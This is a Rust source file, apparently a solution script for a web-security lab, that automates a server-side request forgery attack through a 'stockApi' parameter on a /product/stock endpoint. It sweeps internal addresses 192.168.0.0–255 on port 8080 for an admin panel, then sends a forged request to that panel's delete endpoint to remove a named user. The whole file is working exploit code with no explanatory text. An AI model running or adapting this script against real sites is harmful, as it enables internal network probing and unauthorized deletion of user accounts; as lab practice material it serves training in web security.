use futures::TryStreamExt;
use futures::{stream, StreamExt};
use reqwest::header::{HeaderMap, HeaderValue};
use std::error::Error;

pub async fn delete_user(lab_url: &str, payload_url: &str, name: &str) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();

    let payload = format!("stockApi={}/delete?username={}", payload_url,name);

    let mut headers = HeaderMap::new();
    headers.insert("Content-Type", HeaderValue::from_static("application/x-www-form-urlencoded"));
let request = client .post(format!("{}/product/stock",lab_url))
        .headers(headers)
        .body(payload)
        .build()?;

    let _ = client.execute(request).await?;
    Ok(())
}


pub async fn find_and_delete(url: &str, target_username: &str, threads: usize) -> Result<(), Box<dyn Error>> {
    let client = reqwest::Client::new();

    let urls = (0..256)
        .map(|i| format!("http://192.168.0.{}:8080/admin", i))
        .collect::<Vec<_>>();

    let bodies = stream::iter(urls)
        .map(|payload| {
            let client = &client;
            async move {
                let res = client
                    .post(format!("{}/product/stock", url))
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .body(format!("stockApi={}", payload))
                    .send()
                    .await?;

                Ok::<_, Box<dyn Error>>((payload, res.status().is_success()))
            }
        })
        .buffer_unordered(256);

    bodies.try_for_each_concurrent(threads, |b| async move {
            match b {
                (payload, true) => {
                    println!("[200] {}", payload);
                    delete_user(url, payload.as_str(), target_username).await?;
                }
                (_payload, false) => {
                    // println!("SAD: {}", _payload);
                }
            }
            Ok(())
        })
        .await?;

    Ok(())
}

